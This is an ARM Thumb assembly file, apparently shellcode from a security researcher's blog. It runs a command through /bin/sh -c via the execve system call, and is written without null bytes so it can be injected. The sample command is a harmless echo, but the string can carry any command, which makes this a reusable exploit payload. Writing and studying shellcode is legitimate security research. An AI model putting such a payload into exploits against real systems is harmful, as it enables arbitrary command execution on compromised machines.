/**
  execute command using /bin/sh
  tested with linux running on raspberry pi 3 

  http://modexp.wordpress.com/  
*/

// 72 bytes
    .global _start
    .text

_start:
    // switch to thumb mode
    .code 32
    add    r3, pc, #1
    bx     r3
    
    .code 16
    // execve("/bin/sh", {"/bin/sh", "-c", cmd, NULL}, NULL);
    eor    r3, r3, r3     // r3 = NULL
    
    adr    r0, sh         // r0 = "/bin/shX"
    strb   r3, [r0, #7]   // add null terminator
    
    adr    r1, c_arg      // r1 = "-cXX"
    strb   r3, [r1, #2]   // add null terminator

    adr    r2, cmd        // r4 = cmd
    strb   r3, [r2, #18]  // add null terminator
    
    push   {r0, r1, r2, r3}
    eor    r2, r2, r2     // penv = NULL
    mov    r1, sp         // r1 = argv
    mov    r7, #11        // r7 = execve
    svc    1  
sh:    
.ascii "/bin/shX"
c_arg:
.ascii "-cXX"
cmd:
.ascii "echo Hello, World!"

